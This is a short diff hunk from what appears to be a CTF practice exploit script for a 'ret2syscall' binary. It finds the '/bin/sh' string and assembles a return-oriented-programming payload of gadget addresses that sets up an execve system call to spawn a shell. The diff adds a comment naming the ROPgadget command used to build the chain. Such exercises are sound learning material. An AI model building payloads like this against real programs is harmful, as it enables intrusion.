@@ -41,6 +41,7 @@ def ret2_systemcall(file_name='/mnt/hgfs/CyberSecurity/PWN/ROP/ret2syscall'):
         ebx = int(next(ELF(file_name).search(b'/bin/sh')))  # 0x80be408
 
         print('text: /bin/sh is: 0x%x' % ebx)
+        # ROPgadget --binary ret2syscall --ropchain
         payload = payload + p32(0x0806eb90) + p32(edx) + p32(ecx) + p32(ebx)
 
         # int 80
